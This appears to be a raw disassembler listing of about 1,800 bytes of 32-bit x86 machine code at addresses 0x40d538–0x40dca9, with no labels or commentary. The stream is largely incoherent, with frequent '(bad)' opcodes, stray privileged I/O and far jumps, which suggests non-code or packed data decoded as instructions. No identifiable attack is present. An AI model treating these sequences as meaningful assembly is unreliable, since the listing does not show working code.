  40d538:	pop    ebp
  40d539:	mov    ebx,0x42f07107
  40d53e:	or     BYTE PTR [ecx],dl
  40d540:	cmp    al,0x3c
  40d542:	arpl   WORD PTR [eax+ebp*4+0x8],dx
  40d546:	(bad)  
  40d548:	(bad)  
  40d549:	or     eax,ecx
  40d54b:	pop    ss
  40d54c:	loope  0x40d5bf
  40d54e:	mov    DWORD PTR [ebx+edx*4-0x430b24b6],edi
  40d555:	loop   0x40d53d
  40d557:	add    ebx,0xf00b1d1e
  40d55d:	ja     0x40d553
  40d55f:	data16 (bad) 
  40d561:	stos   DWORD PTR es:[edi],eax
  40d562:	pop    ebp
  40d563:	and    eax,DWORD PTR [edi]
  40d565:	dec    esp
  40d566:	nop
  40d567:	in     al,0x6a
  40d569:	dec    edi
  40d56a:	imul   ecx,eax,0xffffffd9
  40d56d:	push   ds
  40d56e:	push   cs
  40d56f:	cmp    DWORD PTR [eax],esp
  40d571:	imul   esi,esi,0x37
  40d574:	test   al,0x9e
  40d576:	scas   eax,DWORD PTR es:[edi]
  40d577:	mov    ds:0x25aeb6c7,al
  40d57c:	mov    ecx,0x3f7a38e5
  40d581:	imul   ebx,DWORD PTR [esi-0x505c4adc],0x23
  40d588:	addr16 xchg ebp,eax
  40d58a:	inc    esi
  40d58b:	mov    ds:0x57932e6a,al
  40d590:	in     eax,0x3a
  40d592:	xor    DWORD PTR [edx-0x26d319d],0x6a
  40d599:	and    ch,BYTE PTR [eax-0xa97d04b]
  40d59f:	jmp    0x40d5cb
  40d5a1:	jae    0x40d5cb
  40d5a3:	(bad)  
  40d5a4:	int3   
  40d5a5:	bound  edi,QWORD PTR [ebx+ebx*4]
  40d5a8:	into   
  40d5a9:	mov    al,ds:0x2538c501
  40d5ae:	js     0x40d583
  40d5b0:	mov    ecx,0x7d28904
  40d5b5:	scas   al,BYTE PTR es:[edi]
  40d5b6:	lds    edx,FWORD PTR ss:[esi]
  40d5b9:	arpl   si,bp
  40d5bb:	mov    esp,edi
  40d5bd:	arpl   bp,di
  40d5bf:	jle    0x40d602
  40d5c1:	enter  0x26e2,0xcd
  40d5c5:	pop    ds
  40d5c6:	push   es
  40d5c7:	mov    eax,0xcbf751bf
  40d5cc:	or     esi,DWORD PTR [ecx-0x33]
  40d5cf:	mov    ebx,0x8c67443d
  40d5d4:	add    DWORD PTR [eax+ebx*4-0x48c06f63],eax
  40d5db:	sbb    al,0x10
  40d5dd:	dec    ecx
  40d5de:	mov    esi,0x7082f802
  40d5e3:	pop    eax
  40d5e4:	stos   DWORD PTR es:[edi],eax
  40d5e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5e6:	js     0x91faafe7
  40d5ec:	es stos BYTE PTR es:[edi],al
  40d5ee:	stos   DWORD PTR es:[edi],eax
  40d5ef:	cwde   
  40d5f0:	imul   edi,DWORD PTR [ecx-0x533f61a],0xbfca20e5
  40d5fa:	adc    eax,0xac332005
  40d5ff:	in     eax,dx
  40d600:	dec    edi
  40d601:	mov    ss,ecx
  40d603:	adc    DWORD PTR [edx+0x57],eax
  40d606:	xchg   ecx,eax
  40d607:	popf   
  40d608:	stos   BYTE PTR es:[edi],al
  40d609:	fnsave [ecx+eax*8-0x5587d376]
  40d610:	push   esi
  40d611:	mov    esi,0xd6fa531e
  40d616:	and    DWORD PTR [ebp+0x5d],edi
  40d619:	dec    edx
  40d61a:	inc    edi
  40d61b:	shl    BYTE PTR cs:[eax-0x173bcdfc],0xdb
  40d623:	mov    dl,0x1f
  40d625:	arpl   WORD PTR [eax],dx
  40d627:	mov    dl,0xc6
  40d629:	div    bh
  40d62b:	mov    ebp,0x8c94ba18
  40d630:	mov    ecx,ss
  40d632:	aad    0xfb
  40d634:	cmp    eax,0x2fb14edc
  40d639:	(bad)  
  40d63b:	mov    esi,0x8a673ea5
  40d640:	mov    esp,edx
  40d642:	addr16 mov ah,0xfc
  40d645:	pop    edi
  40d646:	add    BYTE PTR [edi-0x5a07871f],al
  40d64c:	xchg   DWORD PTR ds:0x4728e211,ebx
  40d652:	cmp    al,0xf9
  40d654:	inc    edx
  40d655:	(bad)  
  40d656:	and    al,0x6a
  40d658:	mov    dh,0x56
  40d65a:	jle    0x40d60f
  40d65c:	js     0x40d6bd
  40d65e:	call   0x43e7f380
  40d663:	icebp  
  40d664:	(bad)  
  40d665:	mov    edi,0xac57426b
  40d66a:	pop    esp
  40d66b:	push   eax
  40d66c:	cld    
  40d66d:	push   ecx
  40d66e:	add    edi,DWORD PTR [edi+0x21]
  40d671:	adc    DWORD PTR [esi],ecx
  40d673:	lahf   
  40d674:	loop   0x40d625
  40d676:	add    dl,BYTE PTR [ecx-0x69]
  40d679:	cmp    al,BYTE PTR [ebp+edx*2-0x18]
  40d67d:	push   edx
  40d67e:	call   0x2bcc0234
  40d683:	mov    cl,0x6c
  40d685:	pop    esp
  40d686:	lahf   
  40d687:	in     eax,dx
  40d688:	mov    ds:0x9517bf15,al
  40d68d:	scas   eax,DWORD PTR es:[edi]
  40d68e:	ret    0xa8e1
  40d691:	adc    al,0xaf
  40d693:	in     eax,0x55
  40d695:	pop    esi
  40d696:	jecxz  0x40d6e8
  40d698:	test   al,0x88
  40d69a:	inc    edx
  40d69b:	mov    ah,0xff
  40d69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d69e:	outs   dx,DWORD PTR ds:[esi]
  40d69f:	xchg   ecx,eax
  40d6a0:	mov    ebp,0x220d80a4
  40d6a5:	ficom  DWORD PTR [ecx+0x34]
  40d6a8:	jne    0x40d6f7
  40d6aa:	retf   
  40d6ab:	jae    0x40d656
  40d6ad:	aad    0xd7
  40d6af:	lea    edx,[esi+0x41]
  40d6b2:	popf   
  40d6b3:	mov    ecx,0xf2d240bf
  40d6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6b9:	ret    0xce2a
  40d6bc:	mov    dh,0x17
  40d6be:	(bad)  
  40d6bf:	(bad)  
  40d6c0:	jg     0x40d6bb
  40d6c2:	in     al,0x3b
  40d6c4:	mov    esi,0x476fb8c9
  40d6c9:	and    dh,BYTE PTR [ebx+0x2f8b5cb6]
  40d6cf:	or     edi,DWORD PTR ds:0xd3b19c33
  40d6d5:	jle    0x40d71f
  40d6d7:	aaa    
  40d6d8:	int    0xf8
  40d6da:	mov    bl,0x40
  40d6dc:	cli    
  40d6dd:	dec    edx
  40d6de:	xchg   edi,eax
  40d6df:	vpunpckhdq ymm3,ymm0,YMMWORD PTR cs:[edi-0x43]
  40d6e5:	popf   
  40d6e6:	xor    dh,BYTE PTR [edi]
  40d6e8:	xor    DWORD PTR [ecx],ecx
  40d6ea:	popf   
  40d6eb:	mov    al,0x7d
  40d6ed:	pop    esi
  40d6ee:	mov    bh,0x61
  40d6f0:	inc    esp
  40d6f1:	scas   eax,DWORD PTR es:[edi]
  40d6f2:	mov    esi,DWORD PTR [edi+eiz*2]
  40d6f5:	mov    eax,0xf4567f10
  40d6fa:	mov    dl,0x4c
  40d6fc:	cmp    edi,DWORD PTR [ebx+0x42]
  40d6ff:	lea    ecx,[eax+0x4598bc8c]
  40d705:	loope  0x40d6cc
  40d707:	push   ebx
  40d708:	rcr    ebx,1
  40d70a:	push   0x7017de30
  40d70f:	inc    bp
  40d711:	je     0x40d73d
  40d713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d714:	dec    esp
  40d715:	fadd   st,st(3)
  40d717:	cld    
  40d718:	into   
  40d719:	xlat   BYTE PTR ds:[ebx]
  40d71a:	push   cs
  40d71b:	enter  0x878c,0x89
  40d71f:	lahf   
  40d720:	scas   al,BYTE PTR es:[edi]
  40d721:	lock add DWORD PTR [edi],edx
  40d724:	ja     0x40d77a
  40d726:	mov    bh,0x1b
  40d728:	frstor [esi+0x52]
  40d72b:	in     al,0x35
  40d72d:	data16 mov cl,0xf0
  40d730:	(bad)  
  40d731:	loopne 0x40d6c4
  40d733:	mov    bh,0x10
  40d735:	mov    ecx,0xf13cf8dc
  40d73a:	push   esi
  40d73b:	dec    ecx
  40d73c:	dec    edi
  40d73d:	jnp    0x40d77a
  40d73f:	mov    esi,0x967ffb77
  40d744:	std    
  40d745:	inc    ecx
  40d746:	int    0x28
  40d748:	je     0x40d6f0
  40d74a:	cmp    DWORD PTR [esi-0x37af4656],ecx
  40d750:	push   edi
  40d751:	xor    al,BYTE PTR [edi+0x2f5359f5]
  40d757:	xor    bl,BYTE PTR [eax-0x21e5c449]
  40d75d:	pop    edx
  40d75e:	fadd   st(0),st
  40d760:	inc    ecx
  40d761:	fcomp  QWORD PTR [ecx-0x49]
  40d764:	inc    ebx
  40d765:	pop    esi
  40d766:	xchg   ebp,eax
  40d767:	aas    
  40d768:	push   es
  40d769:	add    edx,0xffffff81
  40d76c:	dec    esi
  40d76d:	inc    ebx
  40d76e:	sub    edi,DWORD PTR [edi]
  40d770:	jbe    0x40d7de
  40d772:	sbb    al,0xfe
  40d774:	pop    eax
  40d775:	call   0xd445:0x641de151
  40d77c:	test   eax,0x85ad2122
  40d781:	outs   dx,BYTE PTR ds:[esi]
  40d782:	and    edi,esp
  40d784:	inc    esp
  40d785:	add    bl,dl
  40d787:	jae    0x40d786
  40d789:	mov    cl,0x43
  40d78b:	lea    esi,[esi+ebx*2+0x3e]
  40d78f:	imul   ebp,edi,0xffffffca
  40d792:	sbb    ebp,edx
  40d794:	in     al,dx
  40d795:	retf   
  40d796:	cmp    ebp,DWORD PTR [esi+0x78]
  40d799:	sub    esp,0x3588d79
  40d79f:	sbb    DWORD PTR [ecx+0x55],edx
  40d7a2:	cmp    dl,BYTE PTR [ecx]
  40d7a4:	call   DWORD PTR [esi]
  40d7a6:	pop    edx
  40d7a7:	xor    al,0x67
  40d7a9:	add    eax,0x4253adea
  40d7ae:	out    dx,eax
  40d7af:	(bad)  
  40d7b0:	arpl   WORD PTR [eax+0x2d371c4f],bx
  40d7b6:	adc    bh,BYTE PTR [edx+0x14]
  40d7b9:	sbb    DWORD PTR [eax-0x72],ebx
  40d7bc:	(bad)  [ecx-0x10]
  40d7bf:	icebp  
  40d7c0:	cmc    
  40d7c1:	and    ebp,ecx
  40d7c3:	push   eax
  40d7c4:	jecxz  0x40d7b6
  40d7c6:	out    0x98,eax
  40d7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7c9:	(bad)  
  40d7ca:	cld    
  40d7cb:	pop    eax
  40d7cc:	fsubr  st,st(7)
  40d7ce:	push   es
  40d7cf:	repnz daa 
  40d7d1:	mov    dh,0xe2
  40d7d3:	pop    eax
  40d7d4:	aam    0x57
  40d7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d7:	out    dx,eax
  40d7d8:	cmp    BYTE PTR [edx+ebp*4-0x7a],bh
  40d7dc:	push   eax
  40d7dd:	fst    QWORD PTR [ebx*2+0x28f3d63d]
  40d7e4:	jbe    0x40d804
  40d7e6:	scas   al,BYTE PTR es:[edi]
  40d7e7:	ficomp DWORD PTR [eax]
  40d7e9:	push   es
  40d7ea:	cmp    edi,DWORD PTR [ecx+0x33]
  40d7ed:	sub    al,0x16
  40d7ef:	cmp    DWORD PTR [ecx-0x6e],ecx
  40d7f2:	push   ebp
  40d7f3:	mov    edi,0xe9d4837e
  40d7f8:	jl     0x40d7ba
  40d7fa:	std    
  40d7fb:	mov    ebp,0xaa0e7491
  40d800:	sbb    dh,dl
  40d802:	adc    al,0x8d
  40d804:	xchg   BYTE PTR [esi+0x262a7427],ah
  40d80a:	or     al,0xef
  40d80c:	mov    cl,0xfe
  40d80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d80f:	mov    BYTE PTR [ebx+0x7577c158],cl
  40d815:	pop    esp
  40d816:	call   0x7e95363e
  40d81b:	mov    dl,0xd3
  40d81d:	popf   
  40d81e:	mov    BYTE PTR [edx+0x6e],dh
  40d821:	cmp    eax,0xc07b28c4
  40d826:	sbb    ah,BYTE PTR [edx-0x4c]
  40d829:	inc    eax
  40d82a:	jmp    0x40d89d
  40d82c:	dec    ecx
  40d82d:	and    al,BYTE PTR [edx+0x48bfd145]
  40d833:	icebp  
  40d834:	loope  0x40d7e2
  40d836:	inc    esi
  40d837:	sub    DWORD PTR [edi-0x23],ebp
  40d83a:	or     ah,BYTE PTR [esi]
  40d83c:	mov    eax,cs:0x99195be6
  40d842:	add    ah,BYTE PTR [edi-0x225b5c00]
  40d848:	adc    eax,0x4909ccc5
  40d84d:	outs   dx,DWORD PTR ds:[esi]
  40d84e:	cmc    
  40d84f:	fwait
  40d850:	dec    ebx
  40d851:	mov    ecx,0x5157c29f
  40d856:	push   eax
  40d857:	mov    eax,0xa81a7702
  40d85c:	js     0x40d8c5
  40d85e:	adc    DWORD PTR [ecx-0x2cdcd64e],ecx
  40d864:	out    0xa1,al
  40d866:	fs push edx
  40d868:	scas   al,BYTE PTR es:[edi]
  40d869:	ret    0x3a8d
  40d86c:	mov    DWORD PTR [edi+ebx*8+0x40],edi
  40d870:	repz sbb al,0x9c
  40d873:	adc    eax,0x1a915517
  40d878:	cmp    dh,BYTE PTR [ebx+eiz*8+0xc]
  40d87c:	sbb    eax,0x4e522e9
  40d881:	jl     0x40d8b0
  40d883:	mov    esp,0xdd95db4e
  40d888:	or     BYTE PTR [ebx-0x77],dl
  40d88b:	push   0x38
  40d88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d88e:	sub    eax,0xc533d28
  40d893:	test   BYTE PTR [ebp-0x4e79c41c],dl
  40d899:	hlt    
  40d89a:	imul   ebx,DWORD PTR [ebp+0x8],0x68
  40d89e:	loop   0x40d8d3
  40d8a0:	ds inc ecx
  40d8a2:	mov    eax,0x51ddf8d3
  40d8a7:	dec    esp
  40d8a8:	adc    al,0x69
  40d8aa:	or     BYTE PTR [ebx-0x17],0xb4
  40d8ae:	lea    esi,[esi]
  40d8b0:	cdq    
  40d8b1:	or     eax,0xd086eaa8
  40d8b6:	mov    ch,0xc
  40d8b8:	fild   DWORD PTR fs:[ecx+0x14239bf7]
  40d8bf:	sub    BYTE PTR [edi-0x73351c42],dh
  40d8c5:	aam    0xad
  40d8c7:	push   ss
  40d8c8:	push   edx
  40d8c9:	arpl   bp,bp
  40d8cb:	xor    eax,0xd71be1e4
  40d8d0:	push   ecx
  40d8d1:	push   edi
  40d8d2:	fs dec edx
  40d8d4:	jmp    0xda68944
  40d8d9:	pop    ebp
  40d8da:	mov    ecx,0x5eadf7ed
  40d8df:	adc    ebx,ebx
  40d8e1:	call   0x3cd6:0x485730c2
  40d8e8:	je     0x40d87b
  40d8ea:	mov    ch,0x94
  40d8ec:	push   cs
  40d8ed:	inc    esi
  40d8ee:	(bad)  
  40d8ef:	fimul  WORD PTR [ebx-0x25]
  40d8f2:	push   es
  40d8f3:	push   es
  40d8f4:	and    eax,0xdcb05e6c
  40d8f9:	xchg   ecx,eax
  40d8fa:	pushf  
  40d8fb:	add    dh,BYTE PTR gs:[edx-0x42]
  40d8ff:	repz leave 
  40d901:	mov    dh,0xf7
  40d903:	mov    bl,0x53
  40d905:	ins    BYTE PTR es:[edi],dx
  40d906:	out    dx,al
  40d907:	jp     0x40d8d2
  40d909:	mov    eax,ds:0xf4909beb
  40d90e:	aaa    
  40d90f:	ins    DWORD PTR es:[edi],dx
  40d910:	push   ecx
  40d911:	fadd   DWORD PTR [eax+0x25dfde6d]
  40d917:	ins    DWORD PTR es:[edi],dx
  40d918:	fcomp  st(4)
  40d91a:	mov    al,ds:0x906b21d9
  40d91f:	xchg   esp,eax
  40d920:	ja     0x40d8be
  40d922:	and    BYTE PTR [edi+eax*1-0x11],bh
  40d926:	mov    al,0xe5
  40d928:	ins    DWORD PTR es:[edi],dx
  40d929:	imul   ebx,DWORD PTR [edi-0x29],0xf8187f60
  40d930:	repz call 0xb8e9c172
  40d936:	sar    edx,cl
  40d938:	cdq    
  40d939:	fiadd  DWORD PTR [ebp+0x45]
  40d93c:	jle    0x40d9a1
  40d93e:	xchg   ecx,eax
  40d93f:	jle    0x40d987
  40d941:	and    BYTE PTR [edx-0x6f385b7c],dl
  40d947:	fdiv   DWORD PTR [ebx]
  40d949:	sub    esi,DWORD PTR [edx-0x38e088be]
  40d94f:	loope  0x40d9b0
  40d951:	mov    BYTE PTR [esi+esi*8+0x548f9439],dl
  40d958:	or     DWORD PTR [edi+eiz*4],ebp
  40d95b:	enter  0xff5d,0x0
  40d95f:	out    dx,al
  40d960:	in     al,dx
  40d961:	push   ebp
  40d962:	adc    bl,BYTE PTR [edi]
  40d964:	jae    0x40d9ae
  40d966:	inc    edi
  40d967:	leave  
  40d968:	mov    dl,0x8a
  40d96a:	test   eax,0xbae9ac9d
  40d96f:	push   esi
  40d970:	adc    al,0x8b
  40d972:	repz retf 0x1cd6
  40d976:	xor    al,0x5a
  40d978:	call   0xad1:0x711a328f
  40d97f:	nop
  40d980:	dec    ebx
  40d981:	aas    
  40d982:	add    BYTE PTR [eax-0x7a],bl
  40d985:	jge    0x40d979
  40d987:	and    BYTE PTR [edx],cl
  40d989:	pop    eax
  40d98a:	out    0xd,al
  40d98c:	mov    edi,gs
  40d98e:	mov    gs,ebp
  40d990:	xchg   ecx,eax
  40d991:	jae    0x40d9a3
  40d993:	jmp    0x2a7b:0xf997f506
  40d99a:	and    al,0x25
  40d99c:	xor    eax,0xfecbee62
  40d9a1:	or     dh,BYTE PTR [ecx]
  40d9a3:	fs sbb eax,0xc6f7f576
  40d9a9:	leave  
  40d9aa:	pusha  
  40d9ab:	inc    esp
  40d9ac:	jp     0x40da22
  40d9ae:	inc    esp
  40d9af:	push   ecx
  40d9b0:	or     dh,BYTE PTR [edi-0x2e0ee0a]
  40d9b6:	fucomip st,st(5)
  40d9b8:	xor    esp,esi
  40d9ba:	aaa    
  40d9bb:	adc    al,0xca
  40d9bd:	fst    QWORD PTR [ebp+0x36e60e21]
  40d9c3:	push   ecx
  40d9c4:	adc    dh,dl
  40d9c6:	xchg   ecx,eax
  40d9c7:	fucomi st,st(0)
  40d9c9:	dec    esi
  40d9ca:	push   ecx
  40d9cb:	in     eax,dx
  40d9cc:	mov    DWORD PTR [edx+0x34],edx
  40d9cf:	fstp   TBYTE PTR [esi]
  40d9d1:	xchg   ebx,eax
  40d9d2:	(bad)  
  40d9d3:	adc    BYTE PTR [edi-0x7a336481],ch
  40d9d9:	and    DWORD PTR gs:[ebx],edx
  40d9dc:	aas    
  40d9dd:	cmp    DWORD PTR [edx],0x3c
  40d9e0:	jg     0x40da1f
  40d9e2:	out    0x27,al
  40d9e4:	xchg   edi,eax
  40d9e5:	push   ebx
  40d9e6:	popf   
  40d9e7:	dec    eax
  40d9e8:	mov    BYTE PTR [edi+0x1c5f9886],ah
  40d9ee:	sub    ebp,esi
  40d9f0:	inc    ebp
  40d9f1:	xchg   esp,eax
  40d9f2:	test   DWORD PTR [esp+eax*8+0x12cff285],0xd587d579
  40d9fd:	loop   0x40d993
  40d9ff:	mov    BYTE PTR [edx+ecx*4+0x2432c383],dh
  40da06:	xchg   ecx,eax
  40da07:	xor    DWORD PTR [ebp-0x3f],esi
  40da0a:	imul   edi,DWORD PTR [ebp+ebx*4-0x2c],0x35
  40da0f:	(bad)  
  40da10:	setb   BYTE PTR [edx-0x259754b1]
  40da17:	inc    eax
  40da18:	cmp    ch,BYTE PTR [ebp-0x1f83b27d]
  40da1e:	repz out 0x45,al
  40da21:	sti    
  40da22:	into   
  40da23:	call   0xea3d:0x1aa2fae2
  40da2a:	add    al,0xdc
  40da2c:	jge    0x40d9cb
  40da2e:	mov    cl,0x27
  40da30:	jne    0x40da76
  40da32:	cwde   
  40da33:	int    0xae
  40da35:	push   ss
  40da36:	jbe    0x40daa2
  40da38:	and    ebx,eax
  40da3a:	jle    0x40d9fa
  40da3c:	add    dh,0x92
  40da3f:	cmp    BYTE PTR [edx+0x5d],ah
  40da42:	adc    BYTE PTR [ecx+eax*2+0x2f],cl
  40da46:	cdq    
  40da47:	or     eax,0xb977f870
  40da4c:	mov    edx,0x15f371f4
  40da51:	sub    al,0x3a
  40da53:	retf   0xa062
  40da56:	mov    edx,0x248caeb1
  40da5b:	push   esp
  40da5c:	mov    ecx,0x595d804f
  40da61:	je     0x40da6e
  40da63:	fwait
  40da64:	leave  
  40da65:	aas    
  40da66:	cmp    ebp,esi
  40da68:	push   esp
  40da69:	outs   dx,DWORD PTR ds:[esi]
  40da6a:	xor    DWORD PTR [eax-0x52],eax
  40da6d:	adc    al,0x96
  40da6f:	jno    0x40dac0
  40da71:	and    DWORD PTR [ebx],ebx
  40da73:	mov    DWORD PTR ds:0xf6576258,edx
  40da79:	fnsave [esi-0x4441b598]
  40da7f:	test   eax,0xc63f90d2
  40da84:	xchg   edx,edi
  40da86:	cs sahf 
  40da88:	mov    dh,0x51
  40da8a:	(bad)  
  40da8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da8c:	adc    BYTE PTR [ebx+0x481f5250],dl
  40da92:	inc    ecx
  40da93:	loopne 0x40da57
  40da95:	cmp    eax,0xaef019bd
  40da9a:	mov    esp,0x242feb34
  40da9f:	cwde   
  40daa0:	adc    esi,DWORD PTR [eax+0x1e]
  40daa3:	dec    esp
  40daa4:	push   0xffffffd3
  40daa6:	cmp    eax,0x735f6ed8
  40daab:	cmc    
  40daac:	das    
  40daad:	sub    dh,bh
  40daaf:	xchg   DWORD PTR [ebx+esi*1],ebp
  40dab2:	cmp    eax,0x646220bc
  40dab7:	or     BYTE PTR [edi-0x5d9ff569],dh
  40dabd:	fdiv   DWORD PTR [edi+0x4c]
  40dac0:	aam    0x63
  40dac2:	sub    al,0x25
  40dac4:	lods   al,BYTE PTR ds:[esi]
  40dac5:	push   es
  40dac6:	popa   
  40dac7:	mov    WORD PTR [esi+0x52],cs
  40daca:	out    dx,eax
  40dacb:	xchg   BYTE PTR [edx],bl
  40dacd:	and    eax,0xfe625804
  40dad2:	in     al,0x3f
  40dad4:	ins    BYTE PTR es:[edi],dx
  40dad5:	cmp    edi,ebx
  40dad7:	js     0x40daea
  40dad9:	adc    DWORD PTR [ebp-0x3527473],edi
  40dadf:	lock call 0xe0c6e4d3
  40dae5:	data16 into 
  40dae7:	and    esi,edi
  40dae9:	aas    
  40daea:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40daec:	pop    edx
  40daed:	xchg   edi,eax
  40daee:	popf   
  40daef:	push   ebx
  40daf0:	pop    esi
  40daf1:	dec    esi
  40daf2:	push   0xffffff9f
  40daf4:	push   edx
  40daf5:	bswap  esp
  40daf7:	jbe    0x40dad6
  40daf9:	xchg   esp,eax
  40dafa:	mov    ah,BYTE PTR [edi-0x3d]
  40dafd:	bound  edi,QWORD PTR [esi-0x2d]
  40db00:	xchg   esi,eax
  40db01:	aas    
  40db02:	das    
  40db03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db04:	(bad)  
  40db05:	enter  0x6cbe,0x22
  40db09:	mov    ds:0xdd19a829,al
  40db0e:	ss add ecx,edi
  40db11:	out    0xb,al
  40db13:	mov    eax,ds:0x7def379
  40db18:	or     DWORD PTR [edx],esp
  40db1a:	test   al,0x2b
  40db1c:	retf   
  40db1d:	stc    
  40db1e:	xlat   BYTE PTR ds:[ebx]
  40db1f:	test   BYTE PTR [ebx+eax*4-0x64],0x56
  40db24:	xchg   DWORD PTR [esi],esi
  40db26:	loopne 0x40dab3
  40db28:	mov    WORD PTR [edi+0x779fd2b7],ds
  40db2e:	jp     0x40dbac
  40db30:	(bad)  
  40db31:	loopne 0x40daf6
  40db33:	ret    
  40db34:	lds    ecx,FWORD PTR [ecx-0x80]
  40db37:	xchg   ecx,eax
  40db38:	xor    cl,al
  40db3a:	and    dh,al
  40db3c:	mov    esi,0xada8ee1a
  40db41:	xchg   esi,eax
  40db42:	pushf  
  40db43:	sub    DWORD PTR [edx-0xc],edx
  40db46:	lea    edx,[ecx+0x7c]
  40db49:	mov    al,0x57
  40db4b:	lds    edx,FWORD PTR [edx-0x5730a1ad]
  40db51:	inc    ebx
  40db52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db53:	es (bad) 
  40db55:	(bad)  
  40db57:	sub    eax,0xc3de43c7
  40db5c:	pop    eax
  40db5d:	(bad)  
  40db5e:	pushf  
  40db5f:	mov    al,0x47
  40db61:	shl    BYTE PTR [esi-0x68],cl
  40db64:	dec    ebp
  40db65:	outs   dx,BYTE PTR ds:[esi]
  40db66:	pop    edi
  40db67:	imul   eax,esi,0x52
  40db6a:	gs sbb bh,dh
  40db6d:	pusha  
  40db6e:	bound  ebp,QWORD PTR [ebx+ecx*2-0x2b]
  40db72:	aaa    
  40db73:	shr    BYTE PTR [edi],cl
  40db75:	outs   dx,BYTE PTR ds:[esi]
  40db76:	outs   dx,BYTE PTR ds:[esi]
  40db77:	and    DWORD PTR [ebp+0x1deb9170],esp
  40db7d:	or     eax,0xd012bd8c
  40db82:	lds    ebp,FWORD PTR [esi+0xe]
  40db85:	(bad)  
  40db88:	and    ebx,eax
  40db8a:	push   ds
  40db8b:	jae    0x40db24
  40db8d:	push   eax
  40db8e:	daa    
  40db8f:	cwde   
  40db90:	cdq    
  40db91:	pop    ebx
  40db92:	inc    ebx
  40db93:	ror    ebp,0x19
  40db96:	into   
  40db97:	inc    edx
  40db98:	jmp    0x40dc05
  40db9a:	in     al,dx
  40db9b:	leave  
  40db9c:	int    0xcd
  40db9e:	mov    dh,0x78
  40dba0:	add    eax,0x58ad4fd2
  40dba5:	test   eax,0xbafaf8e9
  40dbaa:	scas   al,BYTE PTR es:[edi]
  40dbab:	inc    esi
  40dbac:	mov    al,ds:0x362bf8ef
  40dbb1:	fldcw  WORD PTR [edi+0x3]
  40dbb4:	adc    edx,DWORD PTR [edi+ebx*2]
  40dbb7:	add    al,0x92
  40dbb9:	sbb    eax,0xa089803d
  40dbbe:	sbb    ah,BYTE PTR [ebp+esi*1-0x64e08687]
  40dbc5:	jge    0x40dbc5
  40dbc7:	push   ss
  40dbc8:	mov    ebx,0xf2cf0f47
  40dbcd:	jmp    0x26ec82fa
  40dbd2:	test   al,0x56
  40dbd4:	loope  0x40db59
  40dbd6:	cdq    
  40dbd7:	clc    
  40dbd8:	xor    DWORD PTR [ebp-0x9],0xee6fb37d
  40dbdf:	mov    dl,0xe0
  40dbe1:	fmul   QWORD PTR [esi+0x6257f170]
  40dbe7:	cli    
  40dbe8:	(bad)  
  40dbe9:	cmp    BYTE PTR [esi+ecx*8-0x76],bl
  40dbed:	sti    
  40dbee:	mov    eax,ds:0xbc0ba224
  40dbf3:	mov    ebp,ebp
  40dbf5:	dec    esp
  40dbf6:	and    ch,bl
  40dbf8:	les    edi,FWORD PTR [ebx+0x2f]
  40dbfb:	push   ebp
  40dbfc:	lahf   
  40dbfd:	add    al,BYTE PTR [edx+edx*2+0x3b34c19e]
  40dc04:	nop
  40dc05:	cmp    eax,0xd1d3018d
  40dc0a:	stos   DWORD PTR es:[edi],eax
  40dc0b:	inc    BYTE PTR [ebx-0x79]
  40dc0e:	in     al,dx
  40dc0f:	lods   al,BYTE PTR ds:[esi]
  40dc10:	push   0x8
  40dc12:	mov    ecx,0xb2d5a47
  40dc17:	add    edx,DWORD PTR [ebp+0x2cd8e88b]
  40dc1d:	jb     0x40dbdc
  40dc1f:	jl     0x40dc80
  40dc21:	cmp    DWORD PTR [eax+0x3a],0x2e
  40dc25:	add    DWORD PTR [edx+0x267d7bf0],eax
  40dc2b:	bound  edx,QWORD PTR [esi-0x2c]
  40dc2e:	xchg   esi,eax
  40dc2f:	stc    
  40dc30:	addr16 xor eax,eax
  40dc33:	aaa    
  40dc34:	cli    
  40dc35:	and    BYTE PTR [edi+0x34ad41af],cl
  40dc3b:	push   edi
  40dc3c:	jnp    0x40dbe5
  40dc3e:	test   al,0x84
  40dc40:	loope  0x40dc62
  40dc42:	jbe    0x40dc57
  40dc44:	shr    BYTE PTR [edx],1
  40dc46:	push   0x4f
  40dc48:	jno    0x40dca3
  40dc4a:	ins    DWORD PTR es:[edi],dx
  40dc4b:	inc    edx
  40dc4c:	fbstp  TBYTE PTR [ebp+eiz*2+0x6e209c6a]
  40dc53:	pusha  
  40dc54:	mov    WORD PTR [edx],ds
  40dc56:	cmp    esp,DWORD PTR [eax-0x4fb21ed0]
  40dc5c:	ret    
  40dc5d:	lahf   
  40dc5e:	add    BYTE PTR [edi],cl
  40dc60:	add    dl,ch
  40dc62:	inc    esp
  40dc63:	rcr    DWORD PTR [ebp-0x4cd93a42],cl
  40dc69:	push   esi
  40dc6a:	imul   eax,ebx,0xffffffaa
  40dc6d:	sti    
  40dc6e:	pop    ebp
  40dc6f:	and    ah,BYTE PTR [edx]
  40dc71:	not    DWORD PTR [eax+ebx*4+0x78]
  40dc75:	push   ebp
  40dc76:	bound  esi,QWORD PTR [esi+0x29]
  40dc79:	(bad)  
  40dc7a:	not    BYTE PTR [ecx]
  40dc7c:	mov    al,0x9e
  40dc7e:	es or  dl,ah
  40dc81:	lods   eax,DWORD PTR ds:[esi]
  40dc82:	sbb    eax,0xac518da1
  40dc87:	retf   0xeb38
  40dc8a:	repnz fistp QWORD PTR [edi+edi*2]
  40dc8e:	mov    ?,WORD PTR [esi+0x7df1457b]
  40dc94:	dec    esi
  40dc95:	in     eax,dx
  40dc96:	mov    dl,0x0
  40dc98:	cmp    edi,DWORD PTR [ebx-0x5c1ac0c2]
  40dc9e:	xor    al,0xd5
  40dca0:	fiadd  DWORD PTR [ecx+0x19]
  40dca3:	daa    
  40dca4:	into   
  40dca5:	(bad)  [edx]
  40dca7:	sub    al,0x10
  40dca9:	adc    cl,BYTE PTR [eax]
